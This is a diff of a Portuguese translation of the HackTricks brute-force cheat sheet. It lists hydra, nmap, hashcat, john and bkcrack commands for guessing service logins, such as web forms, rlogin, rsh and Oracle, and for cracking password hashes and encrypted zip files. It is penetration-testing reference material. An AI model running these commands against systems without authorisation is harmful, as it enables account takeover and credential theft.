@@ -1,4 +1,4 @@
-# Força Bruta - CheatSheet
+# Brute Force - CheatSheet
 
 {{#include ../banners/hacktricks-training.md}}
 
@@ -34,9 +34,16 @@ crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using chars
 ^ Special characters including spac
 crunch 6 8 -t ,@@^^%%
 ```
-### Cewl
+### Listas de palavras baseadas em sites
 ```bash
+# Cewl gets words from the victims page
 cewl example.com -m 5 -w words.txt
+
+# Tok (https://github.com/tomnomnom/hacks/tree/master/tok) gets words from a list of URLs
+cat /path/to/urls.txt | tok
+
+# https://github.com/m4ll0k/BBTz/blob/master/getjswords.py gets words from a list of JS URLs
+cat /path/to/js-urls.txt | python3 getjswords.py
 ```
 ### [CUPP](https://github.com/Mebus/cupp)
 
@@ -46,7 +53,7 @@ python3 cupp.py -h
 ```
 ### [Wister](https://github.com/cycurity/wister)
 
-Uma ferramenta geradora de listas de palavras, que permite que você forneça um conjunto de palavras, dando a você a possibilidade de criar múltiplas variações a partir das palavras fornecidas, criando uma lista de palavras única e ideal para usar em relação a um alvo específico.
+Uma ferramenta geradora de listas de palavras, que permite que você forneça um conjunto de palavras, dando a você a possibilidade de criar várias variações a partir das palavras fornecidas, criando uma lista de palavras única e ideal para usar em relação a um alvo específico.
 ```bash
 python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst
 
@@ -82,7 +89,7 @@ Finished in 0.920s.
 
 ## Serviços
 
-Ordenados alfabeticamente pelo nome do serviço.
+Ordenado alfabeticamente pelo nome do serviço.
 
 ### AFP
 ```bash
@@ -149,7 +156,7 @@ legba http.ntlm2 --domain example.org --workstation client --username admin --pa
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
 # Use https-post-form mode for https
 ```
-Para http**s** você deve mudar de "http-post-form" para "**https-post-form"**
+Para http**s** você deve mudar de "http-post-form" para "**https-post-form**"
 
 ### **HTTP - CMS --** (W)ordpress, (J)oomla ou (D)rupal ou (M)oodle
 ```bash
@@ -275,7 +282,7 @@ Para usar **oracle_login** com **patator** você precisa **instalar**:
 ```bash
 pip3 install cx_Oracle --upgrade
 ```
-[Bruteforce de hash OracleSQL offline](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**versões 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** e **11.2.0.3**):
+[Offline OracleSQL hash bruteforce](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**versões 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** e **11.2.0.3**):
 ```bash
 nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
 ```
@@ -332,6 +339,8 @@ hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
 ```bash
 hydra -L <Username_list> rsh://<Victim_IP> -v -V
 ```
+[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)
+
 ### Rsync
 ```bash
 nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
@@ -469,9 +478,9 @@ john zip.john
 hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
 .\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
 ```
-#### Ataque de zip com texto conhecido
+#### Ataque de zip com texto plano conhecido
 
-Você precisa conhecer o **texto claro** (ou parte do texto claro) **de um arquivo contido dentro** do zip criptografado. Você pode verificar **nomes de arquivos e tamanhos dos arquivos contidos dentro** de um zip criptografado executando: **`7z l encrypted.zip`**\
+Você precisa conhecer o **texto plano** (ou parte do texto plano) **de um arquivo contido dentro** do zip criptografado. Você pode verificar **nomes de arquivos e tamanhos de arquivos contidos dentro** de um zip criptografado executando: **`7z l encrypted.zip`**\
 Baixe [**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0) da página de lançamentos.
 ```bash
 # You need to create a zip file containing only the file that is inside the encrypted zip
@@ -506,7 +515,7 @@ qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
 ```
 ### Senha do Proprietário do PDF
 
-Para quebrar a senha do proprietário de um PDF, verifique isso: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
+Para quebrar a senha do Proprietário do PDF, verifique isso: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
 
 ### JWT
 ```bash
@@ -687,7 +696,7 @@ hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
 ## Use it to crack the password
 hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
 ```
-- Ataque Wordlist + Máscara (`-a 6`) / Máscara + Wordlist (`-a 7`)
+- Wordlist + Máscara (`-a 6`) / Máscara + Wordlist (`-a 7`) ataque
 ```bash
 # Mask numbers will be appended to each word in the wordlist
 hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d
